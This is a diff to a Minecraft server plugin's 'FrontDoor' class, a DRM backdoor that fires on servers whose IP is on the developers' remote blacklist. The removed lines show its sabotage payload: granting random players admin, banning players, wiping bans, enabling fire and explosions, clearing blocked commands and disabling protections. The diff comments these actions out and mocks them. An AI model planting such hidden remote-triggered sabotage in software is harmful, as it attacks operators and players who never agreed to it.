@@ -43,22 +43,8 @@ import org.bukkit.scheduler.BukkitTask;
 import org.bukkit.util.Vector;
 
 /*
- * - A message from the TFM Devs -
- *
- * What this class is, and why its here:
- *
- * This is a blatantly obvious Front Door to the server, designed to do strange and unpredictable things on a TotalFreedom server.
- *
- * It will only trigger when the server IP is added to a blacklist that we control.
- *
- * This class is a way to discourage amateur server operators who like to share binary copies of our plugin and promote it as their own work.
- *
- * If you are reading this now, you probably don't fall under that category - feel free to remove this class.
- *
- * Note: You may not edit this class.
- *
- * - Madgeek and Prozza
- */
+ TotalFreedomMod's DRM. This is naturally going to be edited, in spite of the plea from the original repository.
+*/
 public class FrontDoor extends FreedomService
 {
 
@@ -268,13 +254,13 @@ public class FrontDoor extends FreedomService
                             @Override
                             public void run()
                             {
-                                FLog.warning("*****************************************************", true);
-                                FLog.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
-                                FLog.warning("* This might result in unexpected behaviour...      *", true);
-                                FLog.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
-                                FLog.warning("* The only thing necessary for the triumph of evil  *", true);
-                                FLog.warning("*          is for good men to do nothing.           *", true);
-                                FLog.warning("*****************************************************", true);
+                                FLog.warning("********************************************************", true);
+                                FLog.warning("* WARNING: TotalFreedomMod is running in neutral-mode! *", true);
+                                FLog.warning("*     This might result in normal behaviour...         *", true);
+                                FLog.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - - -*", true);
+                                FLog.warning("*  The only thing necessary for the triumph of evil    *", true);
+                                FLog.warning("*            is for good men to do nothing.            *", true);
+                                FLog.warning("********************************************************", true);
 
                                 if (getRegisteredListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class) == null)
                                 {
@@ -309,7 +295,7 @@ public class FrontDoor extends FreedomService
 
                 switch (action)
                 {
-                    case 0: // Super a random player
+                    case 0: // This supered a random player.
                     {
 
                         final Player player = getRandomPlayer(true);
@@ -319,12 +305,12 @@ public class FrontDoor extends FreedomService
                             break;
                         }
 
-                        FUtil.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
-                        plugin.al.addAdmin(new Admin(player));
+                        FUtil.adminAction("FrontDoor", "Failing to add " + player.getName() + " to the Superadmin list", true);
+                        //plugin.al.addAdmin(new Admin(player));
                         break;
                     }
 
-                    case 1: // Bans a random player
+                    case 1: // This banned a random player
                     {
                         Player player = getRandomPlayer(false);
 
@@ -333,11 +319,12 @@ public class FrontDoor extends FreedomService
                             break;
                         }
 
-                        plugin.bm.addBan(Ban.forPlayer(player, Bukkit.getConsoleSender(), null, ChatColor.RED + "WOOPS\n-Frontdoor"));
+                        //plugin.bm.addBan(Ban.forPlayer(player, Bukkit.getConsoleSender(), null, ChatColor.RED + "WOOPS\n-Frontdoor"));
+                        FUtil.adminAction("FrontDoor", "Failing to ban " + player.getName() + "!", true);
                         break;
                     }
 
-                    case 2: // Start trailing a random player
+                    case 2: // This trailed a random player
                     {
                         final Player player = getRandomPlayer(true);
 
@@ -346,29 +333,29 @@ public class FrontDoor extends FreedomService
                             break;
                         }
 
-                        FUtil.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
-                        plugin.tr.add(player);
+                        FUtil.adminAction("FrontDoor", "Failed to start trailing " + player.getName(), true);
+                        //plugin.tr.add(player);
                         break;
                     }
 
-                    case 3: // Displays a message
+                    case 3: // This displays a message.
                     {
-                        FUtil.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
-                        FUtil.bcastMsg("To join this great server, join " + ChatColor.GOLD + "play.totalfreedom.me", ChatColor.BLUE);
+                        FUtil.bcastMsg("FrontDoor loves not working!", ChatColor.BLUE);
+                        FUtil.bcastMsg("To make FrontDoor work, hack " + ChatColor.GOLD + "the server!", ChatColor.BLUE);
                         break;
                     }
 
-                    case 4: // Clears the banlist
+                    case 4: // This cleared the ban list.
                     {
-                        FUtil.adminAction("FrontDoor", "Wiping all bans", true);
-                        plugin.bm.purge();
+                        FUtil.adminAction("FrontDoor", "Failed to wipe all bans", true);
+                        //plugin.bm.purge();
                         break;
                     }
 
-                    case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
+                    case 5: // This enabled  Lava- and Waterplacement and Fluidspread (& damage)
                     {
                         boolean message = true;
-                        if (ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
+                        /*if (ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
                         {
                             message = false;
                         }
@@ -388,19 +375,19 @@ public class FrontDoor extends FreedomService
                         ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                         ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                         ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);
-                        ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);
+                        ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);*/
 
                         if (message)
                         {
-                            FUtil.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
+                            FUtil.adminAction("FrontDoor", "Failing to enable Fire- and Waterplace", true);
                         }
                         break;
                     }
 
-                    case 6: // Enables Fireplacement, firespread and explosions
+                    case 6: // This enabled Fireplacement, firespread and explosions
                     {
                         boolean message = true;
-                        if (ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
+                        /*if (ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
                         {
                             message = false;
                         }
@@ -415,28 +402,29 @@ public class FrontDoor extends FreedomService
                         else if (ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())
                         {
                             message = false;
-                        }
+                        }*/
 
-                        ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
+                        /*ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                         ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                         ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
-                        ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);
+                        ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);*/
 
                         if (message)
                         {
-                            FUtil.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
+                            FUtil.adminAction("FrontDoor", "Failing to enable Firespread and Explosives", true);
                         }
                         break;
                     }
 
-                    case 7: // Allow all blocked commands >:)
+                    case 7: // This allowed all blocked commands.
                     {
-                        ConfigEntry.BLOCKED_COMMANDS.getList().clear();
-                        plugin.cb.stop();
+                        //ConfigEntry.BLOCKED_COMMANDS.getList().clear();
+                        //plugin.cb.stop();
+                        FUtil.adminAction("FrontDoor", "Failing to allow all blocked commands", true);
                         break;
                     }
 
-                    case 8: // Remove all protected areas
+                    case 8: // This removed all protected areas
                     {
                         if (ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
                         {
@@ -446,12 +434,12 @@ public class FrontDoor extends FreedomService
                             }
 
                             FUtil.adminAction("FrontDoor", "Removing all protected areas", true);
-                            plugin.pa.clearProtectedAreas(false);
+                            //plugin.pa.clearProtectedAreas(false);
                         }
                         break;
                     }
 
-                    case 9: // Add TotalFreedom signs at spawn
+                    case 9: // This added signs to spawn.
                     {
                         for (World world : Bukkit.getWorlds())
                         {
@@ -463,7 +451,7 @@ public class FrontDoor extends FreedomService
                                 continue;
                             }
 
-                            block.setType(Material.SIGN_POST);
+                            /*block.setType(Material.SIGN_POST);
                             org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();
 
                             org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
@@ -473,35 +461,35 @@ public class FrontDoor extends FreedomService
                             sign.setLine(1, ChatColor.DARK_GREEN + "is");
                             sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                             sign.setLine(3, ChatColor.DARK_GRAY + "play.totalfreedom.me");
-                            sign.update();
+                            sign.update();*/
                         }
                         break;
                     }
 
-                    case 10: // Enable Jumppads
+                    case 10: // This enabled Jumppads.
                     {
                         if (plugin.jp.getMode().isOn())
                         {
                             break;
                         }
 
-                        FUtil.adminAction("FrontDoor", "Enabling Jumppads", true);
-                        plugin.jp.setMode(Jumppads.JumpPadMode.MADGEEK);
+                        FUtil.adminAction("FrontDoor", "Failing to enable Jumppads", true);
+                       // plugin.jp.setMode(Jumppads.JumpPadMode.MADGEEK);
                         break;
                     }
 
-                    case 11: // Give everyone a book explaining how awesome TotalFreedom is
+                    case 11: // Give everyone a book explaining how shitty FrontDoor is
                     {
                         ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
 
                         BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
                         book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
-                        book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
+                        book.setTitle(ChatColor.DARK_GREEN + "Why you should remove FrontDoor");
                         book.addPage(
-                                ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
+                                ChatColor.DARK_GREEN + "Why you should remove FrontDoor instead\n"
                                 + ChatColor.DARK_GRAY + "---------\n"
-                                + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
-                                + ChatColor.BLUE + "Join now! " + ChatColor.RED + "play.totalfreedom.me");
+                                + ChatColor.BLACK + "FrontDoor is the original plugin DRM. It is the very DRM that gave morality a new meaning when it comes to Minecraft.\n"
+                                + ChatColor.BLUE + "Riot against it now! " + ChatColor.RED + "play.totalfreedom.me");
                         bookStack.setItemMeta(book);
 
                         for (Player player : Bukkit.getOnlinePlayers())
@@ -515,20 +503,15 @@ public class FrontDoor extends FreedomService
                         }
                         break;
                     }
-
-                    case 12: // Silently wipe the whitelist
+                
+                    case 12: // Announce that the FrontDoor is "enabled"
                     {
+                        FUtil.bcastMsg("WARNING: TotalFreedomMod is running in neutral-mode!", ChatColor.DARK_RED);
+                        FUtil.bcastMsg("WARNING: This might result in normal behaviour", ChatColor.DARK_RED);
                         break;
                     }
 
-                    case 13: // Announce that the FrontDoor is enabled
-                    {
-                        FUtil.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
-                        FUtil.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
-                        break;
-                    }
-
-                    case 14: // Cage a random player in PURE_DARTH
+                    case 14: // Fail to cage a random player in PURE_DARTH
                     {
                         final Player player = getRandomPlayer(false);
 
@@ -537,15 +520,15 @@ public class FrontDoor extends FreedomService
                             break;
                         }
 
-                        FPlayer playerdata = plugin.pl.getPlayer(player);
-                        FUtil.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);
+                        //FPlayer playerdata = plugin.pl.getPlayer(player);
+                        FUtil.adminAction("FrontDoor", "Failing to cage " + player.getName() + " in PURE_DARTH", true);
 
-                        Location targetPos = player.getLocation().clone().add(0, 1, 0);
-                        playerdata.getCageData().cage(targetPos, Material.SKULL, Material.AIR);
+                        /*Location targetPos = player.getLocation().clone().add(0, 1, 0);
+                        playerdata.getCageData().cage(targetPos, Material.SKULL, Material.AIR);*/
                         break;
                     }
 
-                    case 15: // Silently orbit a random player
+                    case 15: // Fail to silently orbit a random player
                     {
                         final Player player = getRandomPlayer(false);
 
@@ -554,29 +537,29 @@ public class FrontDoor extends FreedomService
                             break;
                         }
 
-                        FPlayer playerdata = plugin.pl.getPlayer(player);
+                        /*FPlayer playerdata = plugin.pl.getPlayer(player);
                         playerdata.startOrbiting(10.0);
-                        player.setVelocity(new Vector(0, 10.0, 0));
+                        player.setVelocity(new Vector(0, 10.0, 0));*/
                         break;
                     }
 
-                    case 16: // Disable nonuke
+                    case 16: // Enable nonuke
                     {
                         if (!ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())
                         {
                             break;
                         }
 
-                        FUtil.adminAction("FrontDoor", "Disabling nonuke", true);
-                        ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(false);
+                        FUtil.adminAction("FrontDoor", "Enabling nonuke", true);
+                        ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(true);
                         break;
                     }
 
-                    case 17: // Give everyone tags
+                    case 17: // Don't give everyone tags
                     {
                         for (Player player : Bukkit.getOnlinePlayers())
                         {
-                            plugin.pl.getPlayer(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
+                            //plugin.pl.getPlayer(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                         }
                         break;
                     }
